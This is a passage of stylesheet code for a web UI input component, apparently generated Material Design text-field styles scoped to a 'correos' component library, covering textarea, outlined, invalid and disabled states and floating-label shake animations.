			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: rgba(0, 0, 0, 0.87)
			}

			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: #6200ee;
				border-color: var(--mdc-theme-primary, #6200ee)
			}

			.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
				-webkit-animation: mdc-floating-label-shake-float-above-textarea 250ms 1;
				animation: mdc-floating-label-shake-float-above-textarea 250ms 1
			}

			.mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input {
				border-radius: 4px 0 0 4px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading[dir=rtl].sc-correos-ui-input {
				border-radius: 0 4px 4px 0
			}

			.mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-radius: 0 4px 4px 0
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing[dir=rtl].sc-correos-ui-input {
				border-radius: 4px 0 0 4px
			}

			.mdc-text-field--textarea.sc-correos-ui-input::before,
			.mdc-text-field--textarea.sc-correos-ui-input::after {
				content: none
			}

			.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled) {
				background-color: transparent
			}

			.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-144%) scale(1);
				transform: translateY(-144%) scale(1)
			}

			.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				font-size: 0.75rem
			}

			.mdc-text-field--textarea.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-130%) scale(0.75);
				transform: translateY(-130%) scale(0.75)
			}

			.mdc-text-field--textarea.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				font-size: 1rem
			}

			.mdc-text-field--textarea.sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input {
				left: initial;
				right: 16px;
				position: absolute;
				bottom: 13px
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--textarea.sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input .mdc-text-field-character-counter[dir=rtl].sc-correos-ui-input {
				left: 16px;
				right: initial
			}

			.mdc-text-field--textarea.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				-ms-flex-item-align: auto;
				align-self: auto;
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				height: auto;
				margin: 8px 1px 1px 0;
				padding: 0 16px 16px;
				border: none;
				line-height: 1.75rem
			}

			.mdc-text-field--textarea.sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input+.mdc-text-field__input.sc-correos-ui-input {
				margin-bottom: 28px;
				padding-bottom: 0
			}

			.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				top: 17px;
				width: auto;
				pointer-events: none
			}

			.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input:not(.mdc-floating-label--float-above) {
				-webkit-transform: none;
				transform: none
			}

			.mdc-text-field--textarea.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-width: 2px
			}

			.mdc-text-field--fullwidth.sc-correos-ui-input {
				width: 100%
			}

			.mdc-text-field--fullwidth.sc-correos-ui-input:not(.mdc-text-field--textarea) {
				display: block
			}

			.mdc-text-field--fullwidth.sc-correos-ui-input:not(.mdc-text-field--textarea)::before,
			.mdc-text-field--fullwidth.sc-correos-ui-input:not(.mdc-text-field--textarea)::after {
				content: none
			}

			.mdc-text-field--fullwidth.sc-correos-ui-input:not(.mdc-text-field--textarea):not(.mdc-text-field--disabled) {
				background-color: transparent
			}

			.mdc-text-field--fullwidth.sc-correos-ui-input:not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
				padding: 0
			}

			.mdc-text-field--fullwidth.mdc-text-field--textarea.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				resize: vertical
			}

			.mdc-text-field--fullwidth.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--textarea) {
				border-bottom-color: #b00020;
				border-bottom-color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field-helper-line.sc-correos-ui-input {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: justify;
				justify-content: space-between;
				-webkit-box-sizing: border-box;
				box-sizing: border-box
			}

			.mdc-text-field--dense.sc-correos-ui-input+.mdc-text-field-helper-line.sc-correos-ui-input {
				margin-bottom: 4px
			}

			.mdc-text-field.sc-correos-ui-input+.mdc-text-field-helper-line.sc-correos-ui-input {
				padding-right: 16px;
				padding-left: 16px
			}

			.mdc-form-field.sc-correos-ui-input>.mdc-text-field.sc-correos-ui-input+label.sc-correos-ui-input {
				-ms-flex-item-align: start;
				align-self: flex-start
			}

			.mdc-text-field--focused.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
				color: rgba(98, 0, 238, 0.87)
			}

			.mdc-text-field--focused.sc-correos-ui-input+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text.sc-correos-ui-input:not(.mdc-text-field-helper-text--validation-msg) {
				opacity: 1
			}

			.mdc-text-field--textarea.mdc-text-field--focused.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--focused.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--focused.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: #6200ee;
				border-color: var(--mdc-theme-primary, #6200ee)
			}

			.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
				border-bottom-color: #b00020;
				border-bottom-color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input:hover {
				border-bottom-color: #b00020;
				border-bottom-color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-line-ripple.sc-correos-ui-input {
				background-color: #b00020;
				background-color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
				color: #b00020;
				color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--invalid+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text--validation-msg.sc-correos-ui-input {
				color: #b00020;
				color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--invalid.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				caret-color: #b00020;
				caret-color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--invalid.mdc-text-field--with-trailing-icon.sc-correos-ui-input:not(.mdc-text-field--with-leading-icon):not(.mdc-text-field--disabled) .mdc-text-field__icon.sc-correos-ui-input {
				color: #b00020;
				color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--invalid.mdc-text-field--with-trailing-icon.mdc-text-field--with-leading-icon.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon.sc-correos-ui-input {
				color: #b00020;
				color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--invalid.sc-correos-ui-input+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text--validation-msg.sc-correos-ui-input {
				opacity: 1
			}

			.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: #b00020;
				border-color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: #b00020;
				border-color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: #b00020;
				border-color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: #b00020;
				border-color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: #b00020;
				border-color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: #b00020;
				border-color: var(--mdc-theme-error, #b00020)
			}

			.mdc-text-field--disabled.sc-correos-ui-input {
				background-color: #fafafa;
				border-bottom: none;
				pointer-events: none
			}

			.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				border-bottom-color: rgba(0, 0, 0, 0.06)
			}

			.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				color: rgba(0, 0, 0, 0.37)
			}

			.mdc-text-field--disabled.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				color: rgba(0, 0, 0, 0.37)
			}

			.mdc-text-field--disabled.sc-correos-ui-input+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text.sc-correos-ui-input {
				color: rgba(0, 0, 0, 0.37)
			}

			.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input,
			.mdc-text-field--disabled.sc-correos-ui-input+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input {
				color: rgba(0, 0, 0, 0.37)
			}

			.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				color: rgba(0, 0, 0, 0.3)
			}

			.mdc-text-field--disabled.sc-correos-ui-input:not(.mdc-text-field--textarea) {
				border-bottom-color: rgba(0, 0, 0, 0.12)
			}

			.mdc-text-field--disabled.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				cursor: default
			}

			.mdc-text-field--textarea.mdc-text-field--disabled.sc-correos-ui-input {
				background-color: transparent;
				background-color: #f9f9f9
			}

			.mdc-text-field--textarea.mdc-text-field--disabled.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--disabled.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-text-field--textarea.mdc-text-field--disabled.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
				border-color: rgba(0, 0, 0, 0.06)
			}

			.mdc-text-field--textarea.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				border-bottom: none
			}

			@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-dense {
				0% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8);
					transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0%)) translateY(-70%) scale(0.8);
					transform: translateX(calc(4% - 0%)) translateY(-70%) scale(0.8)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0%)) translateY(-70%) scale(0.8);
					transform: translateX(calc(-4% - 0%)) translateY(-70%) scale(0.8)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8);
					transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8)
				}
			}

			@keyframes mdc-floating-label-shake-float-above-text-field-dense {
				0% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8);
					transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0%)) translateY(-70%) scale(0.8);
					transform: translateX(calc(4% - 0%)) translateY(-70%) scale(0.8)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0%)) translateY(-70%) scale(0.8);
					transform: translateX(calc(-4% - 0%)) translateY(-70%) scale(0.8)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8);
					transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8)
				}
			}

			@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-outlined {
				0% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0%)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(4% - 0%)) translateY(-34.75px) scale(0.75)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0%)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(-4% - 0%)) translateY(-34.75px) scale(0.75)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75)
				}
			}

			@keyframes mdc-floating-label-shake-float-above-text-field-outlined {
				0% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0%)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(4% - 0%)) translateY(-34.75px) scale(0.75)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0%)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(-4% - 0%)) translateY(-34.75px) scale(0.75)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75)
				}
			}

			@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-outlined-dense {
				0% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8);
					transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0%)) translateY(-120%) scale(0.8);
					transform: translateX(calc(4% - 0%)) translateY(-120%) scale(0.8)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0%)) translateY(-120%) scale(0.8);
					transform: translateX(calc(-4% - 0%)) translateY(-120%) scale(0.8)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8);
					transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8)
				}
			}

			@keyframes mdc-floating-label-shake-float-above-text-field-outlined-dense {
				0% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8);
					transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0%)) translateY(-120%) scale(0.8);
					transform: translateX(calc(4% - 0%)) translateY(-120%) scale(0.8)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0%)) translateY(-120%) scale(0.8);
					transform: translateX(calc(-4% - 0%)) translateY(-120%) scale(0.8)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8);
					transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8)
				}
			}

			@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon {
				0% {
					-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
				}
			}

			@keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon {
				0% {
					-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
				}
			}

			@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense {
				0% {
					-webkit-transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(4% - 21px)) translateY(-120%) scale(0.8)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(-4% - 21px)) translateY(-120%) scale(0.8)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8)
				}
			}

			@keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense {
				0% {
					-webkit-transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(4% - 21px)) translateY(-120%) scale(0.8)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(-4% - 21px)) translateY(-120%) scale(0.8)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8);
					transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8)
				}
			}

			@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-rtl {
				0% {
					-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
					transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75);
